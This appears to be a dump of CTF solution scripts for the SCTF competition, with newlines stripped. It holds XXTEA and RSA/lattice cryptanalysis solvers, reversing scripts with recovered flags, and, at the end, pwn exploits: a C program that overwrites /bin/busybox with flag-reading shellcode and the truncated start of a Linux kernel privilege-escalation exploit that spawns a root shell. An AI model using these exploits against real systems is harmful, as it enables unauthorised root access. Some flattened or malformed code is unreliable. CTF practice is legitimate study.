uint32_t t0, t1, t2, t3, t4, t5, t6, t7, t8, t9, t10, t11, t12, t13; t0 = v0 >> 3; t1 = v1 << 3; t2 = t0 ^ t1; t3 = v1 >> 4; t4 = v0 << 2; t5 = t3 ^ t4; t6 = t2 + t5; t7 = v1 ^ v2; t8 = v4 & 2; t9 = t8 ^ v5; t10 = v3[t9]; t11 = t10 ^ v0; t12 = t7 + t11; t13 = t6 ^ t12; res = t13;printf("R: %03d res: %08X| v0: %08X v1: %08X v2: %08X v4: %02d v5:%08Xn", global_count, res, v0, v1, v2, v4, v5);
return res;}
void XXTea_Encrypt(ut32 *src, ut32 n, ut32 *key) { ut32 y, z, sum = 0; ut32 e, rounds;
int p; rounds = 6 + 52 / n; rounds = 5;
int i = 0;do { z = src[n - 1]; sum += delta; e = (sum >> 3) & 3;for (p = 0; p < n - 1; p++) { y = src[p + 1]; global_count += 1; src[p] += round_enc(z, y, sum, key, p, e); z = src[p]; } y = src[0]; global_count += 1; src[n - 1] += round_enc(z, y, sum, key, p, e); i++; } while (--rounds);}
void XXTea_Decrypt(ut32 *enc, ut32 n, ut32 *key) { ut32 y, z, sum; ut32 e, rounds;
int p; rounds = 6 + 52 / n; rounds = 5; sum = delta * rounds;do { e = (sum >> 3) & 3;for (p = n - 1; p > 0; p--) { y = enc[(p + 1) % n]; z = enc[(p - 1)]; enc[p] -= round_enc(z, y, sum, key, p, e); } y = enc[1]; z = enc[n - 1]; enc[0] -= round_enc(z, y, sum, key, p, e); sum -= delta; } while (--rounds);}
int main() {uint32_t key[14] = {83, 'y', 67, 49, 48, 86, 101,82, 102, 48, 82, 86, 101, 114};
 ut32 m[32] = {0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, //0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, //0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, //0x32, 0x32}; ut32 m1[32] = {4108944556, 3404732701, 1466956825, 788072761, 1482427973, 5077893943, 1635740553, 4115935911, 2820454423, 3206473923, 1700989382, 2460803532, 2399057278, 968884411, 1298467094, 1786305447, 3953508515, 2466099443, 4105559714, 5074098393, 31525197679817476, 3322844775, 4122289132, 2089726849, 4951420023, 3096682206, 2217255962, 4975150340, 3394288893, 4992449135, 1109578150, 2272036063}; XXTea_Encrypt(m, 32, key); XXTea_Decrypt(m1, 32, key);printf("%dn", global_count); hexdump(m1, sizeof(m1));for (int i = 0; i < 32; i++) {printf("%c", m1[i]); }printf("n"); // SCTF{w0w_y0U_wE1_kNOw_of_cYtH0N}return 0;}
from Crypto.Util.number import *from gmpy2 import *import base64
def anything(str):
card=list(str.encode())to=len(card)-1perfect(card,0,to,((to-0)+1)//2)return bytes(card)
def perfect(a,from1,to,n):if from1>=to:
returnif from1==to-1:a[from1],a[to]=a[to],a[from1]k=0n2=n*2p=n2+1k_3=1while(k<=p//3):k+=1;p/=3k_3*=3m=(k_3-1)//2rightCircle(a,from1+m,((from1+n)+m)-1,m)i=0t=1while(i<k):
circle(a,from1-1,t,(m*2)+1)i+=1t*=3i2=m*2perfect(a,i2+from1,to,((to-((m*2)+from1))+1)//2)
def circle(a,from1,i,n2):k=(i*2)%n2while(k!=i):a[i+from1],a[k+from1]=a[k+from1],a[i+from1]k=(k*2)%n2
def rightCircle(a,from1,to,n):m=n%((to-from1)+1)reverse(a,(to-m)+1,to)reverse(a,from1,to-m)reverse(a,from1,to)
def reverse(a,from1,to):
while(from1<to):a[from1],a[to]=a[to],a[from1]from1+=1to-=1
enc='YgNxAGMDawJjZQR6B2IGYANiYQVxAG8JYQhkawZ3AW8JagluYAN2Am4GbQRmZAR6AWwBbQNlZANxCWsCaAlhZQRxAm4CbgRkZgl1AWIIawhmYAh3B2MBaAJmaghwAWoEbwliYgBwCWkIbQNuawlyAW0FYAhuYgB1Am8CawRuYAJxCG8CbgRgZAF3BWgJYQlhZwFzAGsJbwFlagV0CW0FawhgawNyCGkAbQNjYQh3Bm4FbwNkYAJ6A2IDaANmYwl2A2sEaQRlaglyAm0HaARmYQZ7AWsIbwZhYwB0B2sIYAlvYgN2AWsHYQJiZAByAGgDYANmYQB0BmwJYABhZwl1CGkEaQlmZQJzBm0IYQdjYwh6A20BbwVhZQl3CGoIaABmYAN1AW0IbQFvYAN0B2gFYAVhZAF1BW8HYQZvagZ6A20CaAhjZAl6BWkCYQhvZAN1AGgDaQJhYQZzCW8BYABjZAN0AW8BbQViZwVyA28JagJiagd1CGgDawhvYQJwB28GagNvYwd6AG0BYQFuawVyBGoBaQFkZAV1A24HbgdlYgd1AWwIYQNkagV6BW0DbglvZAl0A2kFaAhjawB3AmwAbwZgZwV3BGMEaQllYAhzAGsEYAFhYAJ6Bm4GaQdkagl6A20DawdkZgd3BW0JbgRgYQZyB2kJbANnZgdwA2gFaQFnYAh7BW4GbAdhYgd7Bm4DawJmawN0CWMDbgJgYwh0AmwGYQRiYQN2BmIGaAVkYwh2BmsDbAFhaglzB2kAbQBjZwJ1BGkCaghiZgByAWkJaAhhagZ3AG0JaghiYQVwAmMIaAFjYgVzBGh0dHA6Ly80Ny4xMDkuMTA2LjYyOjkwOTB7Im5hbWUiOiJTQ1RGIiwicGFzc3dvcmQiOiI4ODg4ODg4OCJ9'enc=base64.b64decode(enc).decode()enc=list(enc[:
enc.index('http')].encode())xor_key=b'S0C0Z0Y0W'
for i in range(len(enc)):
enc[i]^=xor_key[i%len(xor_key)]
c=int(bytes(enc))
p=10669721913248017310606431714870563867652912174255756777085768772939744689
8790451577487723991083173010242416863238099716044775658681981821407922722052
7789589428918310335124632627410539616815129082180038404085269156296894321114
8058896680094942807901568262459163601067869192728532170893507622195117342689
4836169q=1448194244658423078063536725473441252907167535352396584178838289412
3250962283869276191721180696301116882228166603369515742651586426552704621332
6145174398018859056439431422867957079149967592078894410082695714160599647180
9472075041086187946378722615722628055655177569222883207793088958197260742291
54002310375209e=0x10001
n=p*q
phi=(p-1)*(q-1)
d=invert(e,phi)m=pow(c,d,n)
m=str(m).split('00')[:-1]flag=''
for i in m:
flag+=chr(int(i))
flag_=flagfor i in range(100):
flag_bak=flagflag=anything(flag).decode()if flag==flag_:
print('SCTF{'+flag_bak+'}')#SCTF{wshm56yt7ujhg}Break
import structimport base64inp = "SCTF{abcdefghijklmnopqrstuvwxyz12345678}"inp_enc = bytes.fromhex("9c3b2fb802f5fda366c98731faa28659c801e985146616805e11b573e6f63d26c09ca35c0a24cfdb")ori_enc = bytes.fromhex("33c0c8a3f3bf1d1a3b41b7c6f15e865252cf6b1ec5f9cbbfed7b62f1f7434854fb854cd93530f26e")inp_enc = ori_encinp_enc_dword = []for i in range(0, len(inp_enc), 4): inp_enc_dword.append(struct.unpack(">= 1 res |= 0x80000000else: res >>= 1 rd -= 1return resfor i in range(len(inp_enc_dword)): inp_enc_dword[i] = rev_crc(inp_enc_dword[i])xor_num = [185, 173, 127, 3, 159, 15, 241, 103, 121, 183, 57, 221, 147, 136, 174, 234, 176, 61, 122,7, 242, 137, 229, 52, 35, 85, 216, 78, 183, 218, 236, 113, 136, 108, 116, 39, 123, 101, 142, 245]inp_enc_byte = []for i in inp_enc_dword:
for j in range(4): inp_enc_byte.append((i >> j*8) & 0xff)for i in range(len(inp_enc_byte)): inp_enc_byte[i] ^= xor_num[i]for i in range(len(inp_enc_byte)): inp_enc_byte[i] ^= 30str1 = "".join(chr(i) for i in inp_enc_byte)string1 = "nopqrstDEFGHIJKLhijklUVQRST/WXYZabABCcdefgmuv6789+wxyz012345MNOP"string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"print(base64.b64decode(str1.translate(str.maketrans(string1, string2))))
# Y0u_@re_r1ght_r3ver53_is_easy!
#! sagemath
def attack(N,e): convergents = continued_fraction(ZZ(e) / ZZ(int( (1/2)*(N+sqrt(N)+1)**2+(1/2)*(N+3/4*sqrt(2)*sqrt(N)+1)**2+3/16*N ))).convergents()for c in convergents: k = c.numerator() d = c.denominator()if d.nbits()==254:
try: phi = ZZ(int( (e * d - int(1)) // k )) print(d) var('p q') print(solve([p*q==N,(p^2 + p + 1)*(q^2 + q + 1)==phi],p,q))
except:
continueelse:
continue

n = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840
attack(n,e)
from Crypto.Util.number import *from hashlib import md5
p = 5390597488072767109361706002186244359146023656052952666052036845964423888084380390710080004831930978524731104593204614023979740021938370218984226690661361q = 5984758006806378809956519900535567746479053908385004504598524889746027259134602871258417614666511624425382102292754198444334667792470478919346145707972191

bp = long_to_bytes(int(p))print(bp)FLAG = 'SCTF{'+md5(bp).hexdigest()+'}'print(FLAG)bp = long_to_bytes(int(q))print(bp)FLAG = 'SCTF{'+md5(bp).hexdigest()+'}'print(FLAG)
from random import choicesimport jsonfrom sage.all import *from Crypto.Util.number import *from sage.groups.perm_gps.permgroup_named import SymmetricGroup

# infowith open('output.txt', 'r') as f: data = json.loads(f.read()) AA = eval(data['AA']) b = eval(data['b'])with open('D.matrix', 'r') as f: data = json.loads(f.read()) D = eval(data['D'])with open('Old.matrix', 'r') as f: data = json.loads(f.read()) S = eval(data['S']) p = eval(data['p'])
from prob_info import Per, M, h, HP
# now get MP (this part is useless)mat = matrix(11, 10)mat[0] = HP + [0]mat[1] = h + [1000000]for i in range(9): mat[i + 2, i] = Mres = mat.LLL()for i in range(11):if res[i][-1] == 1000000: res = res[i]breakMP = [a + -b for a, b in zip(h, res[:-1])]

# now get AAA = Matrix(GF(65537), AA)D = Matrix(GF(65537), D)P = PermutationGroupElement(Per)PM = Matrix(GF(65537), P.matrix())DPM = D * PMA = AA * DPM.inverse()
# use part of A to recover sinfo_count = 100mat = matrix(25 + info_count + 1, info_count)for i in range(25):
for j in range(info_count): mat[i, j] = A[j, i]for i in range(info_count): mat[i + 25, i] = 65537mat[-1] = b[:
info_count]res = mat.LLL()
# print(res)res = res[25 + 1]print(res)
# recover ss = A[:25,:].inverse() * (vector(b[:25], GF(65537)) - res[:25])print(s)flag = sum(v * 65537**i for i, v in enumerate(map(int, s)))print(long_to_bytes(flag))
from cryptography.hazmat.backends import default_backendfrom cryptography.hazmat.primitives import serialization
# 读取并解析PEM格式的公钥
def load_pem_public_key(pem_data):
try: public_key = serialization.load_pem_public_key( pem_data.encode(), backend=default_backend() )return public_key
except Exception as e: print(f"Error loading PEM public key: {e}")return None
# 打印公钥信息
def print_public_key_info(public_key):
try:# 获取公钥的类型和公共数字 public_numbers = public_key.public_numbers() print(f"Public Key Type: {type(public_key).__name__}") print(f"Public Numbers: {public_numbers}") print(f"Modulus (n): {public_numbers.n}")
# len print(f"Modulus (n) length: {public_numbers.n.bit_length()}") print(f"Public Exponent (e): {public_numbers.e}") print(f"Public Exponent (e) length: {public_numbers.e.bit_length()}")
except Exception as e: print(f"Error printing public key info: {e}")
# 主函数
def main():
with open("/Whisper/cert1.pem", "r") as f:# with open("/Whisper/cert2.pem", "r") as f: pem_public_key = f.read()
# 加载 PEM 公钥 public_key = load_pem_public_key(pem_public_key)if public_key:# 打印公钥的信息 print_public_key_info(public_key)
if __name__ == "__main__": main()
from sage.all import *import mathimport itertools
# display matrix picture with 0 and X
# references: https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage
def matrix_overview(BB):
for ii in range(BB.dimensions()[0]): a = ('%02d ' % ii)for jj in range(BB.dimensions()[1]): a += ' ' if BB[ii,jj] == 0 else 'X'if BB.dimensions()[0] < 60: a += ' ' print(a)
def dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt):''' Attack to Dual RSA: Liqiang et al.'s attack implementation
 References: [1] Liqiang Peng, Lei Hu, Yao Lu, Jun Xu and Zhangjie Huang. 2016. "Cryptanalysis of Dual RSA" ''' N = (n1+n2)/2 A = ZZ(floor(N^0.5))
 _XX = ZZ(floor(N^delta)) _YY = ZZ(floor(N^0.5)) _ZZ = ZZ(floor(N^(delta - 1./4))) _UU = _XX * _YY + 1
# Find a "good" basis satisfying d = a1 * l'11 + a2 * l'21 M = Matrix(ZZ, [[A, e], [0, n1]]) B = M.LLL() l11, l12 = B[0] l21, l22 = B[1] l_11 = ZZ(l11 / A) l_21 = ZZ(l21 / A)
 modulo = e * l_21 F = Zmod(modulo)
 PR = PolynomialRing(F, 'u, x, y, z') u, x, y, z = PR.gens()
 PK = PolynomialRing(ZZ, 'uk, xk, yk, zk') uk, xk, yk, zk = PK.gens()
# For transform xy to u-1 (unravelled linearlization) PQ = PK.quo(xk*yk+1-uk)
 f = PK(x*(n2 + y) - e*l_11*z + 1)
 fbar = PQ(f).lift()
# Polynomial construction gijk = {}
for k in range(0, mm + 1):
for i in range(0, mm-k + 1):
for j in range(0, mm-k-i + 1): gijk[i, j, k] = PQ(xk^i * zk^j * PK(fbar) ^ k * modulo^(mm-k)).lift()
 hjkl = {}
for j in range(1, tt + 1):
for k in range(floor(mm / tt) * j, mm + 1):
for l in range(0, k + 1): hjkl[j, k, l] = PQ(yk^j * zk^(k-l) * PK(fbar) ^ l * modulo^(mm-l)).lift()
 monomials = []for k in list(gijk.keys()): monomials += gijk[k].monomials()for k in list(hjkl.keys()): monomials += hjkl[k].monomials()
 monomials = sorted(set(monomials))[::-1]assert len(monomials) == len(gijk) + len(hjkl) # square matrix? dim = len(monomials)
# Create lattice from polynmial g_{ijk} and h_{jkl} M = Matrix(ZZ, dim) row = 0for k in list(gijk.keys()):
for i, monomial in enumerate(monomials): M[row, i] = gijk[k].monomial_coefficient(monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ) row += 1for k in list(hjkl.keys()):
for i, monomial in enumerate(monomials): M[row, i] = hjkl[k].monomial_coefficient(monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ) row += 1
 matrix_overview(M) print('=' * 128)
# LLL B = M.LLL()
 matrix_overview(B)
# Construct polynomials from reduced lattices H = [(i, 0) for i in range(dim)] H = dict(H)for j in range(dim):
for i in range(dim): H[i] += PK((monomials[j] * B[i, j]) / monomials[j].subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ)) H = list(H.values())
 PQ = PolynomialRing(QQ, 'uq, xq, yq, zq') uq, xq, yq, zq = PQ.gens()
# Inversion of unravelled linearlizationfor i in range(dim): H[i] = PQ(H[i].subs(uk=xk*yk+1))
# Calculate Groebner basis for solve system of equations''' Actually, These polynomials selection (H[1:20]) is heuristic selection. Because they are "short" vectors. We need a short vector less than Howgrave-Graham bound. So we trying test parameter(at [1]) and decided it. ''' I = Ideal(*H[1:20]) g = I.groebner_basis('giac')[::-1] mon = [t.monomials() for t in g]
 PX = PolynomialRing(ZZ, 'xs') xs = PX.gen()
 x_pol = y_pol = z_pol = None
for i in range(len(g)):if mon[i] == [xq, 1]: print(g[i] / g[i].lc()) x_pol = g[i] / g[i].lc()elif mon[i] == [yq, 1]: print(g[i] / g[i].lc()) y_pol = g[i] / g[i].lc()elif mon[i] == [zq, 1]: print(g[i] / g[i].lc()) z_pol = g[i] / g[i].lc()
if x_pol is None or y_pol is None or z_pol is None: print('[-] Failed: we cannot get a solution...')return
 x0 = x_pol.subs(xq=xs).roots()[0][0] y0 = y_pol.subs(yq=xs).roots()[0][0] z0 = z_pol.subs(zq=xs).roots()[0][0]
# solution checkassert f(x0*y0+1, x0, y0, z0) % modulo == 0
 a0 = z0 a1 = (x0 * (n2 + y0) + 1 - e*l_11*z0) / (e*l_21)
 d = a0 * l_11 + a1 * l_21return d
if __name__ == '__main__':# In [1]: 345/1019
# Out[1]: 0.338567222767419 delta = 0.338 mm = 4 tt = 2
# n1 = alice_public_key.N1 n1 = 19216005446310864558409934096148904703198882317083224129431545386380435777354723744624028053518278514595663319253560114239018542660582960464010994454707936550902872627309424890333127288994449006783158078916602020794628546065674981593736606481809198149080696037584037699638293870122512237711498004090515845499
# n2 = alice_public_key.N2 n2 = 4992911943798277344804876549224813326447469267517432903838084455752417287982320183584988170455130118418117937196562948710115292838538880218156469801938645463822391931977946975012481667095710882823897026534267366981015926659114785262116088548568215969555191689632109516970297562458267207338397574333407150103
# e = alice_public_key.e e = 5352708372343813403035593638037107517373724079700735571091908193413083617555211472255125798199165859811237950085789893649651552088125747433480591652396404710788778815075048587264350078253899425987466937040099316084273123603046629945048298154353920118466252136326911019666012632927688983695457057246503276867
 d2 = dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt) print(f'[+] d = {d2}')
# Output:# d2 = 40938683537002969349994490030778320037535387924227183600857028517800996704376695290532584573854353589803
d2 = 40938683537002969349994490030778320037535387924227183600857028517800996704376695290532584573854353589803
from gmpy2 import invert, powmodfrom Crypto.Util.number import long_to_bytes
n1 = 19216005446310864558409934096148904703198882317083224129431545386380435777354723744624028053518278514595663319253560114239018542660582960464010994454707936550902872627309424890333127288994449006783158078916602020794628546065674981593736606481809198149080696037584037699638293870122512237711498004090515845499n2 = 4992911943798277344804876549224813326447469267517432903838084455752417287982320183584988170455130118418117937196562948710115292838538880218156469801938645463822391931977946975012481667095710882823897026534267366981015926659114785262116088548568215969555191689632109516970297562458267207338397574333407150103e = 5352708372343813403035593638037107517373724079700735571091908193413083617555211472255125798199165859811237950085789893649651552088125747433480591652396404710788778815075048587264350078253899425987466937040099316084273123603046629945048298154353920118466252136326911019666012632927688983695457057246503276867d = 40938683537002969349994490030778320037535387924227183600857028517800996704376695290532584573854353589803
# raw open cipherc_path = r'./ciphertext.txt'with open(c_path, 'rb') as f: c = f.read()
c_int = int.from_bytes(c, 'big')print(f'[+] c_int = {c_int}')m = powmod(c_int, d, n1)print(f'[+] m = {m}')print(f'[+] m = {long_to_bytes(m)}')
from gmpy2 import invert, powmodfrom Crypto.Util.number import long_to_bytes
n1 = 19216005446310864558409934096148904703198882317083224129431545386380435777354723744624028053518278514595663319253560114239018542660582960464010994454707936550902872627309424890333127288994449006783158078916602020794628546065674981593736606481809198149080696037584037699638293870122512237711498004090515845499n2 = 4992911943798277344804876549224813326447469267517432903838084455752417287982320183584988170455130118418117937196562948710115292838538880218156469801938645463822391931977946975012481667095710882823897026534267366981015926659114785262116088548568215969555191689632109516970297562458267207338397574333407150103e = 5352708372343813403035593638037107517373724079700735571091908193413083617555211472255125798199165859811237950085789893649651552088125747433480591652396404710788778815075048587264350078253899425987466937040099316084273123603046629945048298154353920118466252136326911019666012632927688983695457057246503276867d = 40938683537002969349994490030778320037535387924227183600857028517800996704376695290532584573854353589803
# raw open cipherc_path = r'./ciphertext.txt'with open(c_path, 'rb') as f: c = f.read()
c_int = int.from_bytes(c, 'big')print(f'[+] c_int = {c_int}')m = powmod(c_int, d, n1)print(f'[+] m = {m}')print(f'[+] m = {long_to_bytes(m)}')
import itertools#part2 bivariate copper
def small_roots(f, bounds, m=1, d=None):if not d: d = f.degree() print(d,m) R = f.base_ring() N = R.cardinality()
 f /= f.coefficients().pop(0) f = f.change_ring(ZZ)
 G = Sequence([], f.parent())for i in range(m + 1): base = N ^ (m - i) * f ^ ifor shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g)
 B, monomials = G.coefficient_matrix() monomials = vector(monomials)
 factors = [monomial(*bounds) for monomial in monomials]for i, factor in enumerate(factors): B.rescale_col(i, factor)
 B = B.dense_matrix().LLL()
 B = B.change_ring(QQ)for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor)
 H = Sequence([], f.parent().change_ring(QQ))for h in filter(None, B * monomials): H.append(h) I = H.ideal()if I.dimension() == -1: H.pop()elif I.dimension() == 0: roots = []for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root)return roots

p=0x8063d0a21876e5ce1e2101c20015529066ed9976882d1002a29efe0f2fdfcc2743fc9a4b5b651cc97108699eca2fb1f3d93175bae343e7c92e4a41c72d05e57019400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
q=0xe4f0fe49f9ae1492c097a0a988fa71876625fe4fce05b0204f1fdf43ec64b4dac699d28e166efdfc7562d19e58c3493d9100365cf2840b46c0f6ee8d964807170ff2c13c4eb8012ecab37862a3900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000n=0x67f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f22486cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08ea52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd6890a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b503880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd7841096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3fbb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b258d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be85054faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f97328070c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e9046385356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad941812d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c902b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb2089bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5PR.<y0,y1>=Zmod(n)[]f = (p+y0)^5*(q+y1)^2res = small_roots(f,bounds=(2^512,2^408), m=2,d=3 )print(res)'''[(6708022338172260347899030626323676022100749598842650911015897443511894444627151436951734224984454180375617062494685670914830207366629067809127120853621, 27120250680531856264005422077507994977725575176295502437617058870679375973489771046508673680604944356225907266192711870527)]'''
    #include <stdio.h>#include <fcntl.h>#include #include <sys/types.h>
    #define ATTACK_FILE "busybox"#define PAGE_SIZE 4096
int main(int argc, char **argv, char **env){int fd; system("chmod 777 /bin/busybox;cp /bin/busybox /busybox;");
unsigned char elfcode[] = {0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x68, 0x60, 0x66, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01,0x48, 0xb8, 0x2f, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00, 0x6c, 0x50, 0x6a,0x02, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x0f, 0x05, 0x41, 0xba, 0xff,0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x01, 0x5f,0x99, 0x0f, 0x05, 0xEB}; fd = open(ATTACK_FILE, O_RDWR | O_CREAT | O_TRUNC, 0666);if (fd < 0) { perror("Error opening file");
return 1; }
// 写入 ELF 代码到文件ssize_t bytes_written = write(fd, elfcode, sizeof(elfcode));if (bytes_written < 0) { perror("Error writing to file"); close(fd);
return 1; }
// 关闭文件 close(fd);printf("ELF code written to %s successfully.n", ATTACK_FILE); system("cp /busybox /bin/busybox;");
return 0;}
    #define _GNU_SOURCE#include <fcntl.h>#include #include <stdio.h>#include <stdlib.h>#include <sys/msg.h>#include <sys/syscall.h>#include <linux/userfaultfd.h>#include #include <sys/mman.h>#include <sys/ioctl.h>#include <semaphore.h>#include <sys/ipc.h>#include <stdint.h>
    #define COLOR_GREEN " 33[32m"#define COLOR_RED " 33[31m"#define COLOR_YELLOW " 33[33m"#define COLOR_DEFAULT " 33[0m"
    #define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "n", __FILE__, __LINE__, ##__VA_ARGS__)#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define die(fmt, ...) do { loge(fmt, ##__VA_ARGS__); loge("Exit at line %d", __LINE__); exit(1); } while (0)
void get_root_shell(void){if (getuid()) { die("Failed to get the root!"); }
puts("[*] Successful to get the root. Execve root shell now..."); system("/bin/sh");exit(0);}
size_t user_cs, user_ss, user_rflags, user_sp;
void saveUserState(){ __asm__("mov %cs,user_cs;""mov %ss,user_ss;""mov %rsp,user_sp;""pushf;""pop user_rflags;"); logi("[+] user states have been saved!!");}
    #define PAGE_SIZE 0x1000
int fd = -1, flag = 0, msg_qid, pipe_fd[2];
char tmp_buf[0x30];
char buf[0x30];
char msg_buf[0x400 - 0x30];
char leak_buf[0x2000];
size_t kernel_base, prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode;
size_t ptr;
void bind_core(int core){cpu_set_t cpu_set;
 CPU_ZERO(&cpu_set); CPU_SET(core, &cpu_set); sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
 logi("Process binded to core %dn", core);}
struct list_head{uint64_t next;
uint64_t prev;};
struct msg_msg{struct list_head m_list;
uint64_t m_type;
uint64_t m_ts;
uint64_t next;
uint64_t security;};
struct msg_msgseg{uint64_t next;};
/*struct msgbuf { long mtype; char mtext[0];};*/
int get_msg_queue(void){return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);}
int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp){return msgrcv(msqid, msgp, msgsz, msgtyp, 0);}
/** * the msgp should be a pointer to the `struct msgbuf`, * and the data should be stored in msgbuf.mtext */int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp){ *(long *)msgp = msgtyp;
return msgsnd(msqid, msgp, msgsz, 0);}
/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp){return msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT | MSG_NOERROR);}
void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,uint64_t m_type, uint64_t m_ts, uint64_t next, uint64_t security){ msg->m_list.next = m_list_next; msg->m_list.prev = m_list_prev; msg->m_type = m_type; msg->m_ts = m_ts; msg->next = next; msg->security = security;}
void RegisterUserfault(void *fault_page, void *handler){pthread_t thr;
struct uffdio_api ua;
struct uffdio_register ur;
size_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); ua.api = UFFD_API; ua.features = 0;if (ioctl(uffd, UFFDIO_API, &ua) == -1) die("[-] ioctl-UFFDIO_API");
